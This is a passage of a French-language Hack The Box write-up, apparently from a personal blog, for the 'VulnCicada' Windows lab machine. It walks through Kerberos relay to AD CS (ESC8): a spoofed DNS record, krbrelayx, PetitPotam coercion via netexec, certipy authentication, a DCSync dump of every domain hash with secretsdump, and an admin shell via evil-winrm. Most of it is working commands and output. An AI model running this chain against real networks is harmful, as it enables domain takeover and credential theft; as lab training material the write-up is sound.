+<li><a href="https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html" target="_blank" rel="noopener noreffer ">Tiraniddo</a></li>
+<li><a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html" target="_blank" rel="noopener noreffer ">Synacktiv</a></li>
+</ul>
+<p>En regardant le writeup de <code>0xdf</code> ainsi que le poste de <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html" target="_blank" rel="noopener noreffer ">Synactiv</a>, je vois qu&rsquo;il faut ajouter un enregistrement DNS qui inclut un SPN sérialisé qui incitera le serveur à demander un ticket Kerberos pour le compte de la machine mais se connecte à l&rsquo;enregistrement malveillant qui pointe vers l&rsquo;attaquant.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 10.10.14.89
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA has been successfully added</span></span></code></pre></div></div>
+<p>Ensuite, nous démarrerons notre serveur relais sur lequel nous travaillerons pour que ADCS s&rsquo;authentifie.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  krbrelayx.py -t <span class="s2">&#34;http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp&#34;</span> --adcs --template DomainController -smb2support -v <span class="s1">&#39;DC-JPQ225$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client LDAPS loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client LDAP loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client HTTP loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client HTTPS loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client SMB loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running in attack mode to single host
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running in kerberos relay mode because no credentials were specified.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up SMB Server
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up HTTP Server on port <span class="m">80</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up DNS Server</span></span></code></pre></div></div>
+<p>J&rsquo;utilise ensuite <code>netexec</code> pour tenter de le forcer à s&rsquo;authentifier auprès de notre serveur. Nous devons d&rsquo;abord déterminer les méthodes que <code>netexec</code> considère comme efficaces.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o <span class="nv">LISTENER</span><span class="o">=</span>dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA <span class="nv">METHOD</span><span class="o">=</span>PetitPotam
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC-JPQ225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>+<span class="o">]</span> cicada.vl<span class="se">\R</span>osie.Powell:Cicada123
+</span></span><span class="line"><span class="cl">COERCE_PLUS DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        VULNERABLE, PetitPotam
+</span></span><span class="line"><span class="cl">COERCE_PLUS DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        Exploit Success, lsarpc<span class="se">\E</span>fsRpcAddUsersToFile</span></span></code></pre></div></div>
+<p>J&rsquo;obtiens une connexion au niveau du relais, et cela crée finalement un certificat.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  krbrelayx.py -t <span class="s2">&#34;http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp&#34;</span> --adcs --template DomainController -smb2support -v <span class="s1">&#39;DC-JPQ225$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client LDAPS loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client LDAP loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client HTTP loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client HTTPS loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client SMB loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running in attack mode to single host
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running in kerberos relay mode because no credentials were specified.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up SMB Server
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up HTTP Server on port <span class="m">80</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up DNS Server
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Servers started, waiting <span class="k">for</span> connections
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> SMBD: Received connection from 10.129.4.235
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> HTTP server returned status code 200, treating as a successful login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> SMBD: Received connection from 10.129.4.235
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> HTTP server returned status code 200, treating as a successful login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating CSR...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating CSR...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> CSR generated!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting certificate...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> CSR generated!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting certificate...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> GOT CERTIFICATE! ID <span class="m">88</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> GOT CERTIFICATE! ID <span class="m">87</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing PKCS#12 certificate to ./DC-JPQ225$.pfx
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing PKCS#12 certificate to ./DC-JPQ225$.pfx
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate successfully written to file
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate successfully written to file</span></span></code></pre></div></div>
+<p>Je m&rsquo;authentifie avec <code>certipy</code> et je récupère le hash du compte machine <code>dc-jpq225$</code> ainsi que le TGT que j&rsquo;exporte dans la variable <code>KRB5CCNAME</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  certipy auth -pfx DC-JPQ225<span class="se">\$</span>.pfx -domain <span class="s2">&#34;cicada.vl&#34;</span>
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using principal: dc-jpq225<span class="nv">$@</span>cicada.vl
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get TGT...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got TGT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved credential cache to <span class="s1">&#39;dc-jpq225.ccache&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to retrieve NT <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;dc-jpq225$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;dc-jpq225$@cicada.vl&#39;</span>: aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>dc-jpq225<span class="se">\$</span>.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:dc-jpq225$.ccache
+</span></span><span class="line"><span class="cl">Default principal: dc-jpq225<span class="nv">$@</span>CICADA.VL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
+</span></span><span class="line"><span class="cl">07/22/2025 15:26:27  07/23/2025 01:26:27  krbtgt/CICADA.VL@CICADA.VL
+</span></span><span class="line"><span class="cl">        renew <span class="k">until</span> 07/23/2025 15:26:28</span></span></code></pre></div></div>
+<h3 id="dcsync">DCSync</h3>
+<p>J&rsquo;utilise <code>secretsdump</code> pour récupérer les hash de tous les utilisateurs du domaine. Je n&rsquo;ai normalement pas besoin des hash de tous les utilisateurs mais juste celui de l&rsquo;administrateur. Pour cela on peut utiliser l&rsquo;option <code>-just-dc-user &lt;USERNAME&gt;</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  secretsdump -k -no-pass <span class="s1">&#39;cicada.vl/dc-jpq225$@dc-jpq225.cicada.vl&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\S</span>hirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\J</span>ordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\J</span>ane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\J</span>oyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\D</span>aniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\R</span>osie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\M</span>egan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\K</span>atie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\R</span>ichard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
+</span></span><span class="line"><span class="cl">cicada.vl<span class="se">\D</span>ebra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
+</span></span><span class="line"><span class="cl">DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::</span></span></code></pre></div></div>
+<p>Je forge un ticket pour l&rsquo;administrateur et me connecte à la machine avec <code>evil-winrm</code>. Je récupère donc les deux flags.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  getTGT.py cicada.vl/<span class="s1">&#39;administrator&#39;</span> -hashes <span class="s1">&#39;:85a0da53871a9d56b6cd05deda3a5e87&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in administrator.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:administrator.ccache
+</span></span><span class="line"><span class="cl">Default principal: administrator@CICADA.VL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
+</span></span><span class="line"><span class="cl">07/22/2025 15:28:44  07/23/2025 01:28:44  krbtgt/CICADA.VL@CICADA.VL
+</span></span><span class="line"><span class="cl">        renew <span class="k">until</span> 07/23/2025 15:28:45
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  evil-winrm -i dc-jpq225.cicada.vl -r cicada.vl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>dc-jpq225<span class="se">\p</span>rofiles$<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a----         9/15/2024   6:26 AM           <span class="m">2304</span> Microsoft Edge.lnk
+</span></span><span class="line"><span class="cl">-ar---         7/22/2025   5:57 AM             <span class="m">34</span> root.txt
+</span></span><span class="line"><span class="cl">-ar---         7/22/2025   5:57 AM             <span class="m">34</span> user.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type</span> root.txt
+</span></span><span class="line"><span class="cl">eefa0fceafdde6e70bf85ed84aa455b2
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
+</span></span><span class="line"><span class="cl">645cd84d44f5489e899046554befd3b4</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/vulncicada/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/vulncicada/" data-title="VulnCicada" data-via="z3rodol" data-hashtags="Medium,Windows,Active Directory,ESC8,DCSync"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/medium/">Medium</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/esc8/">ESC8</a>,&nbsp;<a href="/tags/dcsync/">DCSync</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/voleur/" class="next" rel="next" title="Voleur">Voleur<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
